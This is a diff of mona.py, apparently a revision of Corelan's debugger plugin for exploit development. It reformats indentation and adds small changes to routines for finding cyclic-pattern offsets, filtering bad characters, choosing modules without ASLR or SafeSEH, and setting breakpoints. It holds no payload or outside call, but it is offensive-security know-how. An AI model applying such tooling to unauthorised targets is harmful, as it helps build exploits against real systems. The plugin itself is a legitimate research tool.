+			if len(cont) == 4:
+				cval=""				
+				for sbytes in cont:
+					tval = hex(ord(sbytes)).replace("0x","")
+					if len(tval) < 2:
+						tval="0"+tval
+					cval = tval+cval
+				try:				
+					contat = dbg.readMemory(hexStrToInt(cval),4)
+				except:
+					contat = ""	
+					
+				if contat != "":
+					for pattype in pattypes:
+						dbg.updateLog()
+						regpattern = fullpattern
+						
+						hexpat = contat
+					
+						if pattype == "upper":
+							regpattern = regpattern.upper()
+						if pattype == "lower":
+							regpattern = regpattern.lower()
+						if pattype == "unicode":
+							hexpat1 = dbg.readMemory(stackcounter,4)
+							hexpat2 = dbg.readMemory(stackcounter+4,4)
+							hexpat1 = hexpat1.replace('\x00','')
+							hexpat2 = hexpat2.replace('\x00','')
+							if hexpat1 == "" or hexpat2 == "":
+								#no unicode
+								hexpat = ""
+								break
+							else:
+								hexpat = hexpat1 + hexpat2
+						
+						if len(hexpat) == 4:
+							offset = regpattern.find(hexpat)
+							currptr = hexStrToInt(cval)
+							
+							if offset > -1:				
+								thissize = getPatternLength(currptr,pattype)
+								if thissize > 0:
+									offsetvalue = int(str(espoffset).replace("-",""))
+									if not silent:
+										dbg.log("    0x%s : Pointer into %s cyclic pattern at ESP%s0x%s (%s%s) : 0x%s : offset %d, length %d" % (toHex(stackcounter),pattype,sign,rmLeading(toHex(offsetvalue),"0"),sign,offsetvalue,toHex(currptr),offset,thissize))
+									tofile += "    0x%s : Pointer into %s cyclic pattern at ESP%s0x%s (%s%s) : 0x%s : offset %d, length %d\n" % (toHex(stackcounter),pattype,sign,rmLeading(toHex(offsetvalue),"0"),sign,offsetvalue,toHex(currptr),offset,thissize)
+									if not currptr in stack:
+										stack[currptr] = ([offsetvalue,sign,offset,thissize,pattype])					
+							
+			stackcounter += 4
+	else:
+		dbg.log("** Are you connected to an application ?",highlight=1)
+		
+	if not "stack" in results:
+		results["stack"] = stack
+	if not "stackcontains" in results:
+		results["stackcontains"] = stack
+		
+	if tofile != "":
+		objfindmspfile = MnLog("findmsp.txt")
+		findmspfile = objfindmspfile.reset()
+		objfindmspfile.write(tofile,findmspfile)
+	return results
+	
+	
 #-----------------------------------------------------------------------#
 # convert arguments to criteria
 #-----------------------------------------------------------------------#
 
 def args2criteria(args,modulecriteria,criteria):
 
-    thisversion,thisrevision = getVersionInfo(inspect.stack()[0][1])
-    thisversion = thisversion.replace("'","")
-    dbg.logLines("\n---------- Mona command started on %s (v%s, rev %s) ----------" % (datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),thisversion,thisrevision))
-    dbg.log("[+] Processing arguments and criteria")
-    global ptr_to_get
-    
-    # meets access level ?
-    criteria["accesslevel"] = "X"
-    if "x" in args : 
-        if not args["x"].upper() in ["*","R","RW","RX","RWX","W","WX","X"]:
-            dbg.log("invalid access level : %s" % args["x"], highlight=1)
-            criteria["accesslevel"] = ""
-        else:
-            criteria["accesslevel"] = args["x"].upper()
-        
-    dbg.log("    - Pointer access level : %s" % criteria["accesslevel"])
-    
-    # query OS modules ?
-    if "o" in args and args["o"]:
-        modulecriteria["os"] = False
-        dbg.log("    - Ignoring OS modules")
-    
-    # allow nulls ?
-    if "n" in args and args["n"]:
-        criteria["nonull"] = True
-        dbg.log("    - Ignoring pointers that have null bytes")
-    
-    # override list of modules to query ?
-    if "m" in args:
-        if type(args["m"]).__name__.lower() <> "bool":
-            modulecriteria["modules"] = args["m"]
-            dbg.log("    - Only querying modules %s" % args["m"])
-                
-    # limit nr of pointers to search ?
-    if "p" in args:
-        if str(args["p"]).lower() != "true":
-            ptr_to_get = int(args["p"].strip())
-        if ptr_to_get > 0:  
-            dbg.log("    - Maximum nr of pointers to return : %d" % ptr_to_get)
-    
-    # only want to see specific type of pointers ?
-    if "cp" in args:
-        ptrcriteria = args["cp"].split(",")
-        for ptrcrit in ptrcriteria:
-            ptrcrit=ptrcrit.strip("'")
-            ptrcrit=ptrcrit.strip('"').lower().strip()
-            criteria[ptrcrit] = True
-        dbg.log("    - Pointer criteria : %s" % ptrcriteria)
-    
-    if "cpb" in args:
-        badchars = args["cpb"]
-        badchars = badchars.replace("'","")
-        badchars = badchars.replace('"',"")
-        badchars = badchars.replace("\\x","")
-        # see if we need to expand ..
-        bpos = 0
-        newbadchars = ""
-        while bpos < len(badchars):
-            curchar = badchars[bpos]+badchars[bpos+1]
-            if curchar == "..":
-                pos = bpos
-                if pos > 1 and pos <= len(badchars)-4:
-                    # get byte before and after ..
-                    bytebefore = badchars[pos-2] + badchars[pos-1]
-                    byteafter = badchars[pos+2] + badchars[pos+3]
-                    bbefore = int(bytebefore,16)
-                    bafter = int(byteafter,16)
-                    insertbytes = ""
-                    bbefore += 1
-                    while bbefore < bafter:
-                        insertbytes += "%02x" % bbefore
-                        bbefore += 1
-                    newbadchars += insertbytes
-            else:
-                newbadchars += curchar
-            bpos += 2
-        badchars = newbadchars
-        cnt = 0
-        strb = ""
-        while cnt < len(badchars):
-            strb=strb+binascii.a2b_hex(badchars[cnt]+badchars[cnt+1])
-            cnt=cnt+2
-        criteria["badchars"] = strb
-        dbg.log("    - Bad char filter will be applied to pointers : %s " % args["cpb"])
-            
-    if "cm" in args:
-        modcriteria = args["cm"].split(",")
-        for modcrit in modcriteria:
-            modcrit=modcrit.strip("'")
-            modcrit=modcrit.strip('"').lower().strip()
-            #each criterium has 1 or 2 parts : criteria=value
-            modcritparts = modcrit.split("=")
-            try:
-                if len(modcritparts) < 2:
-                    # set to True, no value given
-                    modulecriteria[modcritparts[0].strip()] = True
-                else:
-                    # read the value
-                    modulecriteria[modcritparts[0].strip()] = (modcritparts[1].strip() == "true")
-            except:
-                continue
-        if (inspect.stack()[1][3] == "procShowMODULES"):
-            modcriteria = args["cm"].split(",")
-            for modcrit in modcriteria:
-                modcrit=modcrit.strip("'")
-                modcrit=modcrit.strip('"').lower().strip()
-                if modcrit.startswith("+"):
-                    modulecriteria[modcrit]=True
-                else:
-                    modulecriteria[modcrit]=False
-        dbg.log("    - Module criteria : %s" % modcriteria)
+	thisversion,thisrevision = getVersionInfo(inspect.stack()[0][1])
+	thisversion = thisversion.replace("'","")
+	dbg.logLines("\n---------- Mona command started on %s (v%s, rev %s) ----------" % (datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),thisversion,thisrevision))
+	dbg.log("[+] Processing arguments and criteria")
+	global ptr_to_get
+	
+	# meets access level ?
+	criteria["accesslevel"] = "X"
+	if "x" in args : 
+		if not args["x"].upper() in ["*","R","RW","RX","RWX","W","WX","X"]:
+			dbg.log("invalid access level : %s" % args["x"], highlight=1)
+			criteria["accesslevel"] = ""
+		else:
+			criteria["accesslevel"] = args["x"].upper()
+		
+	dbg.log("    - Pointer access level : %s" % criteria["accesslevel"])
+	
+	# query OS modules ?
+	if "o" in args and args["o"]:
+		modulecriteria["os"] = False
+		dbg.log("    - Ignoring OS modules")
+	
+	# allow nulls ?
+	if "n" in args and args["n"]:
+		criteria["nonull"] = True
+		dbg.log("    - Ignoring pointers that have null bytes")
+	
+	# override list of modules to query ?
+	if "m" in args:
+		if type(args["m"]).__name__.lower() != "bool":
+			modulecriteria["modules"] = args["m"]
+			dbg.log("    - Only querying modules %s" % args["m"])
+				
+	# limit nr of pointers to search ?
+	if "p" in args:
+		if str(args["p"]).lower() != "true":
+			ptr_to_get = int(args["p"].strip())
+		if ptr_to_get > 0:	
+			dbg.log("    - Maximum nr of pointers to return : %d" % ptr_to_get)
+	
+	# only want to see specific type of pointers ?
+	if "cp" in args:
+		ptrcriteria = args["cp"].split(",")
+		for ptrcrit in ptrcriteria:
+			ptrcrit=ptrcrit.strip("'")
+			ptrcrit=ptrcrit.strip('"').lower().strip()
+			criteria[ptrcrit] = True
+		dbg.log("    - Pointer criteria : %s" % ptrcriteria)
+	
+	if "cbp" in args:
+		dbg.log("    * Trying to use '-cbp' instead of '-cpb'?", highlight=True)
+		if not "cpb" in args:
+			dbg.log("    * I'll try to fix your typo myself, but please pay attention to the syntax next time", highlight=True)
+			args["cpb"] = args["cbp"]
+	
+	if "cpb" in args:
+		badchars = args["cpb"]
+		badchars = badchars.replace("'","")
+		badchars = badchars.replace('"',"")
+		badchars = badchars.replace("\\x","")
+		# see if we need to expand ..
+		bpos = 0
+		newbadchars = ""
+		while bpos < len(badchars):
+			curchar = badchars[bpos]+badchars[bpos+1]
+			if curchar == "..":
+				pos = bpos
+				if pos > 1 and pos <= len(badchars)-4:
+					# get byte before and after ..
+					bytebefore = badchars[pos-2] + badchars[pos-1]
+					byteafter = badchars[pos+2] + badchars[pos+3]
+					bbefore = int(bytebefore,16)
+					bafter = int(byteafter,16)
+					insertbytes = ""
+					bbefore += 1
+					while bbefore < bafter:
+						insertbytes += "%02x" % bbefore
+						bbefore += 1
+					newbadchars += insertbytes
+			else:
+				newbadchars += curchar
+			bpos += 2
+		badchars = newbadchars
+		cnt = 0
+		strb = ""
+		while cnt < len(badchars):
+			strb=strb+binascii.a2b_hex(badchars[cnt]+badchars[cnt+1])
+			cnt=cnt+2
+		criteria["badchars"] = strb
+		dbg.log("    - Bad char filter will be applied to pointers : %s " % args["cpb"])
+			
+	if "cm" in args:
+		modcriteria = args["cm"].split(",")
+		for modcrit in modcriteria:
+			modcrit=modcrit.strip("'")
+			modcrit=modcrit.strip('"').lower().strip()
+			#each criterium has 1 or 2 parts : criteria=value
+			modcritparts = modcrit.split("=")
+			try:
+				if len(modcritparts) < 2:
+					# set to True, no value given
+					modulecriteria[modcritparts[0].strip()] = True
+				else:
+					# read the value
+					modulecriteria[modcritparts[0].strip()] = (modcritparts[1].strip() == "true")
+			except:
+				continue
+		if (inspect.stack()[1][3] == "procShowMODULES"):
+			modcriteria = args["cm"].split(",")
+			for modcrit in modcriteria:
+				modcrit=modcrit.strip("'")
+				modcrit=modcrit.strip('"').lower().strip()
+				if modcrit.startswith("+"):
+					modulecriteria[modcrit]=True
+				else:
+					modulecriteria[modcrit]=False
+		dbg.log("    - Module criteria : %s" % modcriteria)
 
     return modulecriteria,criteria          
                 
     
 #manage breakpoint on selected exported/imported functions from selected modules
-def doManageBpOnFunc(modulecriteria,criteria,funcfilter,mode="add",type="export"):  
-    """
-    Sets a breakpoint on selected exported/imported functions from selected modules
-    
-    Arguments : 
-    modulecriteria - Dictionary
-    funcfilter - comma separated string indicating functions to set bp on
-            must contains "*" to select all functions
-    mode - "add" to create bp's, "del" to remove bp's
-    
-    Returns : nothing
-    """
-    
-    type = type.lower()
-    
-    namecrit = funcfilter.split(",")
-    
-    if mode == "add" or mode == "del" or mode == "list":
-        if not silent:
-            dbg.log("[+] Enumerating %sed functions" % type)
-        modulestosearch = getModulesToQuery(modulecriteria)
-        
-        bpfuncs = {}
-        
-        for thismodule in modulestosearch:
-            if not silent:
-                dbg.log(" Querying module %s" % thismodule)
-            # get all
-            themod = dbg.getModule(thismodule)
-            tmod = MnModule(thismodule)
-            shortname = tmod.getShortName()
-            syms = themod.getSymbols()
-            # get funcs
-            funcs = {}
-            if type == "export":
-                funcs = tmod.getEAT()
-            else:
-                funcs = tmod.getIAT()
-            if not silent:
-                dbg.log("   Total nr of %sed functions : %d" % (type,len(funcs)))
-            for func in funcs:
-                if meetsCriteria(MnPointer(func), criteria):
-                    funcname = funcs[func].lower()
-                    setbp = False
-                    if "*" in namecrit:
-                        setbp = True
-                    else:
-                        for crit in namecrit:
-                            crit = crit.lower()
-                            tcrit = crit.replace("*","")
-                            if (crit.startswith("*") and crit.endswith("*")) or (crit.find("*") == -1):
-                                if funcname.find(tcrit) > -1:
-                                    setbp = True
-                            elif crit.startswith("*"):
-                                if funcname.endswith(tcrit):
-                                    setbp = True
-                            elif crit.endswith("*"):
-                                if funcname.startswith(tcrit):
-                                    setbp = True
-                    
-                    if setbp:
-                        if type == "export":
-                            if not func in bpfuncs:
-                                bpfuncs[func] = funcs[func]
-                        else:
-                            ptr = 0
-                            try:
-                                #read pointer of imported function
-                                ptr=struct.unpack('<L',dbg.readMemory(func,4))[0]
-                            except:
-                                pass
-                            if ptr > 0:
-                                if not ptr in bpfuncs:
-                                    bpfuncs[ptr] = funcs[func]
-            if __DEBUGGERAPP__ == "WinDBG":
-                # let's do a few searches
-                for crit in namecrit:
-                    if crit.find("*") == -1:
-                        crit = "*" + crit + "*"
-                    modsearch = "x %s!%s" % (shortname,crit)
-                    output = dbg.nativeCommand(modsearch)
-                    outputlines = output.split("\n")
-                    for line in outputlines:
-                        if line.replace(" ","") != "":
-                            linefields = line.split(" ")
-                            if len(linefields) > 1:
-                                ptr = hexStrToInt(linefields[0])
-                                cnt = 1
-                                while cnt < len(linefields)-1:
-                                    if linefields[cnt] != "":
-                                        funcname = linefields[cnt]
-                                        break
-                                    cnt += 1
-                                if not ptr in bpfuncs:
-                                    bpfuncs[ptr] = funcname
+def doManageBpOnFunc(modulecriteria,criteria,funcfilter,mode="add",type="export"):	
+	"""
+	Sets a breakpoint on selected exported/imported functions from selected modules
+	
+	Arguments : 
+	modulecriteria - Dictionary
+	funcfilter - comma separated string indicating functions to set bp on
+			must contains "*" to select all functions
+	mode - "add" to create bp's, "del" to remove bp's
+	
+	Returns : nothing
+	"""
+	
+	type = type.lower()
+	
+	namecrit = funcfilter.strip('"').strip("'").split(",")
+	
+	if mode == "add" or mode == "del" or mode == "list":
+		if not silent:
+			dbg.log("[+] Enumerating %sed functions" % type)
+		modulestosearch = getModulesToQuery(modulecriteria)
+		
+		bpfuncs = {}
+		
+		for thismodule in modulestosearch:
+			if not silent:
+				dbg.log(" Querying module %s" % thismodule)
+			# get all
+			themod = dbg.getModule(thismodule)
+			tmod = MnModule(thismodule)
+			shortname = tmod.getShortName()
+			syms = themod.getSymbols()
+			# get funcs
+			funcs = {}
+			if type == "export":
+				funcs = tmod.getEAT()
+			else:
+				funcs = tmod.getIAT()
+			if not silent:
+				dbg.log("   Total nr of %sed functions : %d" % (type,len(funcs)))
+			for func in funcs:
+				if meetsCriteria(MnPointer(func), criteria):
+					funcname = funcs[func].lower()
+					setbp = False
+					if "*" in namecrit:
+						setbp = True
+					else:
+						for crit in namecrit:
+							crit = crit.lower()
+							tcrit = crit.replace("*","")
+							if (crit.startswith("*") and crit.endswith("*")) or (crit.find("*") == -1):
+								if funcname.find(tcrit) > -1:
+									setbp = True
+							elif crit.startswith("*"):
+								if funcname.endswith(tcrit):
+									setbp = True
+							elif crit.endswith("*"):
+								if funcname.startswith(tcrit):
+									setbp = True
+					
+					if setbp:
+						if type == "export":
+							if not func in bpfuncs:
+								bpfuncs[func] = funcs[func]
+						else:
+							ptr = 0
+							try:
+								#read pointer of imported function
+								ptr=struct.unpack('<L',dbg.readMemory(func,4))[0]
+							except:
+								pass
+							if ptr > 0:
+								if not ptr in bpfuncs:
+									bpfuncs[ptr] = funcs[func]
+			if __DEBUGGERAPP__ == "WinDBG":
+				# let's do a few searches
+				for crit in namecrit:
+					if crit.find("*") == -1:
+						crit = "*" + crit + "*"
+					modsearch = "x %s!%s" % (shortname,crit)
+					output = dbg.nativeCommand(modsearch)
+					outputlines = output.split("\n")
+					for line in outputlines:
+						if line.replace(" ","") != "":
+							linefields = line.split(" ")
+							if len(linefields) > 1:
+								ptr = hexStrToInt(linefields[0])
+								cnt = 1
+								while cnt < len(linefields)-1:
+									if linefields[cnt] != "":
+										funcname = linefields[cnt]
+										break
+									cnt += 1
+								if not ptr in bpfuncs:
+									bpfuncs[ptr] = funcname
 
         if not silent:
             dbg.log("[+] Total nr of breakpoints to process : %d" % len(bpfuncs))
@@ -11121,6 +11703,41 @@ def doManageBpOnFunc(modulecriteria,criteria,funcfilter,mode="add",type="export"
                     dbg.log("Match found at 0x%s (%s in %s)" % (toHex(funcptr),bpfuncs[funcptr],MnPointer(funcptr).belongsTo()))
                         
     return
+
+def getAbsolutePath(filename):
+	# attempt to read input file from workingfolder (if any)
+	# unless absolute path has been specified
+	if os.path.isabs(filename) or filename == "":
+		return filename
+	else:
+		debuggedname = dbg.getDebuggedName()
+		thispid = dbg.getDebuggedPid()
+		if thispid == 0:
+			debuggedname = "_no_name_"
+		thisconfig = MnConfig()
+		workingfolder = thisconfig.get("workingfolder").rstrip("\\").strip()
+		#strip extension from debuggedname
+		parts = debuggedname.split(".")
+		extlen = len(parts[len(parts)-1])+1
+		debuggedname = debuggedname[0:len(debuggedname)-extlen]
+		debuggedname = debuggedname.replace(" ","_")
+		workingfolder = workingfolder.replace('%p', debuggedname)
+		workingfolder = workingfolder.replace('%i', str(thispid))		
+
+		# create workingfolder (if it does not exist yet)
+		#does working folder exist ?
+		if workingfolder != "":
+			if not os.path.exists(workingfolder):
+				try:
+					dbg.log("    - Creating working folder %s" % workingfolder)
+					#recursively create folders
+					os.makedirs(workingfolder)
+					dbg.log("    - Folder created")
+				except:
+					dbg.log("   ** Unable to create working folder %s, the debugger program folder will be used instead" % workingfolder,highlight=1)
+
+		return os.path.join(workingfolder, filename)
+
 
 #-----------------------------------------------------------------------#
 # main
@@ -11193,164 +11810,165 @@ def main(args):
             random.shuffle(bannerlist)
             return banners[bannerlist[0]]
 
-        
-        def procHelp(args):
-            dbg.log("     'mona' - Exploit Development Swiss Army Knife - %s (%sbit)" % (__DEBUGGERAPP__,str(arch)))
-            dbg.log("     Plugin version : %s r%s" % (__VERSION__,__REV__))
-            if __DEBUGGERAPP__ == "WinDBG":
-                pykdversion = dbg.getPyKDVersionNr()
-                dbg.log("     PyKD version %s" % pykdversion)
-            dbg.log("     Written by Corelan - https://www.corelan.be")
-            dbg.log("     Project page : https://github.com/corelan/mona")
-            dbg.logLines(getBanner(),highlight=1)
-            dbg.log("Global options :")
-            dbg.log("----------------")
-            dbg.log("You can use one or more of the following global options on any command that will perform")
-            dbg.log("a search in one or more modules, returning a list of pointers :")
-            dbg.log(" -n                     : Skip modules that start with a null byte. If this is too broad, use")
-            dbg.log("                          option -cp nonull instead")
-            dbg.log(" -o                     : Ignore OS modules")
-            dbg.log(" -p <nr>                : Stop search after <nr> pointers.")
-            dbg.log(" -m <module,module,...> : only query the given modules. Be sure what you are doing !")
-            dbg.log("                          You can specify multiple modules (comma separated)")
-            dbg.log("                          Tip : you can use -m *  to include all modules. All other module criteria will be ignored")
-            dbg.log("                          Other wildcards : *blah.dll = ends with blah.dll, blah* = starts with blah,")
-            dbg.log("                          blah or *blah* = contains blah")
-            dbg.log(" -cm <crit,crit,...>    : Apply some additional criteria to the modules to query.")
-            dbg.log("                          You can use one or more of the following criteria :")
-            dbg.log("                          aslr,safeseh,rebase,nx,os")
-            dbg.log("                          You can enable or disable a certain criterium by setting it to true or false")
-            dbg.log("                          Example :  -cm aslr=true,safeseh=false")
-            dbg.log("                          Suppose you want to search for p/p/r in aslr enabled modules, you could call")
-            dbg.log("                          !mona seh -cm aslr")
-            dbg.log(" -cp <crit,crit,...>    : Apply some criteria to the pointers to return")
-            dbg.log("                          Available options are :")
-            dbg.log("                          unicode,ascii,asciiprint,upper,lower,uppernum,lowernum,numeric,alphanum,nonull,startswithnull,unicoderev")
-            dbg.log("                          Note : Multiple criteria will be evaluated using 'AND', except if you are looking for unicode + one crit")
-            dbg.log(" -cpb '\\x00\\x01'        : Provide list with bad chars, applies to pointers")
-            dbg.log("                          You can use .. to indicate a range of bytes (in between 2 bad chars)")
-            dbg.log(" -x <access>            : Specify desired access level of the returning pointers. If not specified,")
-            dbg.log("                          only executable pointers will be returned.")
-            dbg.log("                          Access levels can be one of the following values : R,W,X,RW,RX,WX,RWX or *")
-            
-            if not args:
-                args = []
-            if len(args) > 1:
-                thiscmd = args[1].lower().strip()
-                if thiscmd in commands:
-                    dbg.log("")
-                    dbg.log("Usage of command '%s' :" % thiscmd)
-                    dbg.log("%s" % ("-" * (22 + len(thiscmd))))
-                    dbg.logLines(commands[thiscmd].usage)
-                    dbg.log("")
-                else:
-                    aliasfound = False
-                    for cmd in commands:
-                        if commands[cmd].alias == thiscmd:
-                            dbg.log("")
-                            dbg.log("Usage of command '%s' :" % thiscmd)
-                            dbg.log("%s" % ("-" * (22 + len(thiscmd))))
-                            dbg.logLines(commands[cmd].usage)
-                            dbg.log("")
-                            aliasfound = True
-                    if not aliasfound:
-                        dbg.logLines("\nCommand %s does not exist. Run !mona to get a list of available commands\n" % thiscmd,highlight=1)
-            else:
-                dbg.logLines("\nUsage :")
-                dbg.logLines("-------\n")
-                dbg.log(" !mona <command> <parameter>")
-                dbg.logLines("\nAvailable commands and parameters :\n")
+		
+		def procHelp(args):
+			dbg.log("     'mona' - Exploit Development Swiss Army Knife - %s (%sbit)" % (__DEBUGGERAPP__,str(arch)))
+			dbg.log("     Plugin version : %s r%s" % (__VERSION__,__REV__))
+			dbg.log("     Python version : %s" % (getPythonVersion()))
+			if __DEBUGGERAPP__ == "WinDBG":
+				pykdversion = dbg.getPyKDVersionNr()
+				dbg.log("     PyKD version %s" % pykdversion)
+			dbg.log("     Written by Corelan - https://www.corelan.be")
+			dbg.log("     Project page : https://github.com/corelan/mona")
+			dbg.logLines(getBanner(),highlight=1)
+			dbg.log("Global options :")
+			dbg.log("----------------")
+			dbg.log("You can use one or more of the following global options on any command that will perform")
+			dbg.log("a search in one or more modules, returning a list of pointers :")
+			dbg.log(" -n                     : Skip modules that start with a null byte. If this is too broad, use")
+			dbg.log("                          option -cp nonull instead")
+			dbg.log(" -o                     : Ignore OS modules")
+			dbg.log(" -p <nr>                : Stop search after <nr> pointers.")
+			dbg.log(" -m <module,module,...> : only query the given modules. Be sure what you are doing !")
+			dbg.log("                          You can specify multiple modules (comma separated)")
+			dbg.log("                          Tip : you can use -m *  to include all modules. All other module criteria will be ignored")
+			dbg.log("                          Other wildcards : *blah.dll = ends with blah.dll, blah* = starts with blah,")
+			dbg.log("                          blah or *blah* = contains blah")
+			dbg.log(" -cm <crit,crit,...>    : Apply some additional criteria to the modules to query.")
+			dbg.log("                          You can use one or more of the following criteria :")
+			dbg.log("                          aslr,safeseh,rebase,nx,os")
+			dbg.log("                          You can enable or disable a certain criterium by setting it to true or false")
+			dbg.log("                          Example :  -cm aslr=true,safeseh=false")
+			dbg.log("                          Suppose you want to search for p/p/r in aslr enabled modules, you could call")
+			dbg.log("                          !mona seh -cm aslr")
+			dbg.log(" -cp <crit,crit,...>    : Apply some criteria to the pointers to return")
+			dbg.log("                          Available options are :")
+			dbg.log("                          unicode,ascii,asciiprint,upper,lower,uppernum,lowernum,numeric,alphanum,nonull,startswithnull,unicoderev")
+			dbg.log("                          Note : Multiple criteria will be evaluated using 'AND', except if you are looking for unicode + one crit")
+			dbg.log(" -cpb '\\x00\\x01'        : Provide list with bad chars, applies to pointers")
+			dbg.log("                          You can use .. to indicate a range of bytes (in between 2 bad chars)")
+			dbg.log(" -x <access>            : Specify desired access level of the returning pointers. If not specified,")
+			dbg.log("                          only executable pointers will be returned.")
+			dbg.log("                          Access levels can be one of the following values : R,W,X,RW,RX,WX,RWX or *")
+			
+			if not args:
+				args = []
+			if len(args) > 1:
+				thiscmd = args[1].lower().strip()
+				if thiscmd in commands:
+					dbg.log("")
+					dbg.log("Usage of command '%s' :" % thiscmd)
+					dbg.log("%s" % ("-" * (22 + len(thiscmd))))
+					dbg.logLines(commands[thiscmd].usage)
+					dbg.log("")
+				else:
+					aliasfound = False
+					for cmd in commands:
+						if commands[cmd].alias == thiscmd:
+							dbg.log("")
+							dbg.log("Usage of command '%s' :" % thiscmd)
+							dbg.log("%s" % ("-" * (22 + len(thiscmd))))
+							dbg.logLines(commands[cmd].usage)
+							dbg.log("")
+							aliasfound = True
+					if not aliasfound:
+						dbg.logLines("\nCommand %s does not exist. Run !mona to get a list of available commands\n" % thiscmd,highlight=1)
+			else:
+				dbg.logLines("\nUsage :")
+				dbg.logLines("-------\n")
+				dbg.log(" !mona <command> <parameter>")
+				dbg.logLines("\nAvailable commands and parameters :\n")
 
-                items = commands.items()
-                items.sort(key = itemgetter(0))
-                for item in items:
-                    if commands[item[0]].usage <> "":
-                        aliastxt = ""
-                        if commands[item[0]].alias != "":
-                            aliastxt = " / " + commands[item[0]].alias
-                        dbg.logLines("%s | %s" % (item[0] + aliastxt + (" " * (20 - len(item[0]+aliastxt))), commands[item[0]].description))
-                dbg.log("")
-                dbg.log("Want more info about a given command ?  Run !mona help <command>",highlight=1)
-                dbg.log("")
-        
-        commands["help"] = MnCommand("help", "show help", "!mona help [command]",procHelp)
-        
-        # ----- Config file management ----- #
-        
-        def procConfig(args):
-            #did we specify -get, -set or -add?
-            showerror = False
-            if not "set" in args and not "get" in args and not "add" in args:
-                showerror = True
-                
-            if "set" in args:
-                if type(args["set"]).__name__.lower() == "bool":
-                    showerror = True
-                else:
-                    #count nr of words
-                    params = args["set"].split(" ")
-                    if len(params) < 2:
-                        showerror = True
-            if "add" in args:
-                if type(args["add"]).__name__.lower() == "bool":
-                    showerror = True
-                else:
-                    #count nr of words
-                    params = args["add"].split(" ")
-                    if len(params) < 2:
-                        showerror = True
-            if "get" in args:
-                if type(args["get"]).__name__.lower() == "bool":
-                    showerror = True
-                else:
-                    #count nr of words
-                    params = args["get"].split(" ")
-                    if len(params) < 1:
-                        showerror = True
-            if showerror:
-                dbg.log("Usage :")
-                dbg.logLines(configUsage,highlight=1)
-                return
-            else:
-                if "get" in args:
-                    dbg.log("Reading value from configuration file")
-                    monaConfig = MnConfig()
-                    thevalue = monaConfig.get(args["get"])
-                    dbg.log("Parameter %s = %s" % (args["get"],thevalue))
-                
-                if "set" in args:
-                    dbg.log("Writing value to configuration file")
-                    monaConfig = MnConfig()
-                    value = args["set"].split(" ")
-                    configparam = value[0].strip()
-                    dbg.log("Old value of parameter %s = %s" % (configparam,monaConfig.get(configparam)))
-                    configvalue = args["set"][0+len(configparam):len(args["set"])]
-                    monaConfig.set(configparam,configvalue)
-                    dbg.log("New value of parameter %s = %s" % (configparam,configvalue))
-                
-                if "add" in args:
-                    dbg.log("Writing value to configuration file")
-                    monaConfig = MnConfig()
-                    value = args["add"].split(" ")
-                    configparam = value[0].strip()
-                    dbg.log("Old value of parameter %s = %s" % (configparam,monaConfig.get(configparam)))
-                    configvalue = monaConfig.get(configparam).strip() + "," + args["add"][0+len(configparam):len(args["add"])].strip()
-                    monaConfig.set(configparam,configvalue)
-                    dbg.log("New value of parameter %s = %s" % (configparam,configvalue))
-                
-        # ----- Jump to register ----- #
-    
-        def procFindJ(args):
-            return procFindJMP(args)
-        
-        def procFindJMP(args):
-            #default criteria
-            modulecriteria={}
-            modulecriteria["aslr"] = False
-            modulecriteria["rebase"] = False
-            
-            if (inspect.stack()[1][3] == "procFindJ"):
-                dbg.log(" ** Note : command 'j' has been replaced with 'jmp'. Now launching 'jmp' instead...",highlight=1)
+				items = commands.items()
+				items.sort(key = itemgetter(0))
+				for item in items:
+					if commands[item[0]].usage != "":
+						aliastxt = ""
+						if commands[item[0]].alias != "":
+							aliastxt = " / " + commands[item[0]].alias
+						dbg.logLines("%s | %s" % (item[0] + aliastxt + (" " * (20 - len(item[0]+aliastxt))), commands[item[0]].description))
+				dbg.log("")
+				dbg.log("Want more info about a given command ?  Run !mona help <command>",highlight=1)
+				dbg.log("")
+		
+		commands["help"] = MnCommand("help", "show help", "!mona help [command]",procHelp)
+		
+		# ----- Config file management ----- #
+		
+		def procConfig(args):
+			#did we specify -get, -set or -add?
+			showerror = False
+			if not "set" in args and not "get" in args and not "add" in args:
+				showerror = True
+				
+			if "set" in args:
+				if type(args["set"]).__name__.lower() == "bool":
+					showerror = True
+				else:
+					#count nr of words
+					params = args["set"].split(" ")
+					if len(params) < 2:
+						showerror = True
+			if "add" in args:
+				if type(args["add"]).__name__.lower() == "bool":
+					showerror = True
+				else:
+					#count nr of words
+					params = args["add"].split(" ")
+					if len(params) < 2:
+						showerror = True
+			if "get" in args:
+				if type(args["get"]).__name__.lower() == "bool":
+					showerror = True
+				else:
+					#count nr of words
+					params = args["get"].split(" ")
+					if len(params) < 1:
+						showerror = True
+			if showerror:
+				dbg.log("Usage :")
+				dbg.logLines(configUsage,highlight=1)
+				return
+			else:
+				if "get" in args:
+					dbg.log("Reading value from configuration file")
+					monaConfig = MnConfig()
+					thevalue = monaConfig.get(args["get"])
+					dbg.log("Parameter %s = %s" % (args["get"],thevalue))
+				
+				if "set" in args:
+					dbg.log("Writing value to configuration file")
+					monaConfig = MnConfig()
+					value = args["set"].split(" ")
+					configparam = value[0].strip()
+					dbg.log("Old value of parameter %s = %s" % (configparam,monaConfig.get(configparam)))
+					configvalue = args["set"][0+len(configparam):len(args["set"])]
+					monaConfig.set(configparam,configvalue)
+					dbg.log("New value of parameter %s = %s" % (configparam,configvalue))
+				
+				if "add" in args:
+					dbg.log("Writing value to configuration file")
+					monaConfig = MnConfig()
+					value = args["add"].split(" ")
+					configparam = value[0].strip()
+					dbg.log("Old value of parameter %s = %s" % (configparam,monaConfig.get(configparam)))
+					configvalue = monaConfig.get(configparam).strip() + "," + args["add"][0+len(configparam):len(args["add"])].strip()
+					monaConfig.set(configparam,configvalue)
+					dbg.log("New value of parameter %s = %s" % (configparam,configvalue))
+				
+		# ----- Jump to register ----- #
+	
+		def procFindJ(args):
+			return procFindJMP(args)
+		
+		def procFindJMP(args):
+			#default criteria
+			modulecriteria={}
+			modulecriteria["aslr"] = False
+			modulecriteria["rebase"] = False
+			
+			if (inspect.stack()[1][3] == "procFindJ"):
+				dbg.log(" ** Note : command 'j' has been replaced with 'jmp'. Now launching 'jmp' instead...",highlight=1)
 
             criteria={}
             all_opcodes={}
@@ -11502,79 +12120,165 @@ def main(args):
             modulecriteria["rebase"] = False
             modulecriteria["os"] = False
 
-            criteria={}
-            
-            modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
-            
-            # handle optional arguments
-            
-            depth = 6
-            maxoffset = 40
-            thedistance = 8
-            split = False
